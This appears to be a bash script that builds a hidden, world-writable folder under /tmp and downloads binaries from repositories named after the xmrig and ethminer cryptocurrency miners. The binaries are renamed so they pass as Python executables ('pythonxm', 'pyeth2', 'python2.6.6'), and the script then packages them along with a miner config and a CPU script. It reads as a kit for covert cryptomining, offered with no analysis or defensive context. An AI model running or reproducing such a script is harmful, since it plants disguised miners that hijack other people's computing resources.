#!/bin/bash
TEMP_MAX=/tmp/.max
apt update && apt install csh  python3 python3-pip python3-argcomplete xclip -y
mkdir $TEMP_MAX
cd $TEMP_MAX
chmod 777 $TEMP_MAX
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm
wget -q https://github.com/one10001/10001code/raw/main/config.json
wget -q https://github.com/one10001/10001code/raw/main/pythonheq
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
wget -q https://github.com/one10001/10001code/raw/main/config.json
wget -q  https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6
wget -q -O /tmp/.max/jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
cp ../cpu03.sh $TEMP_MAX/
chmod 777 $TEMP_MAX -R
cd /tmp
tar -czf cpu  .max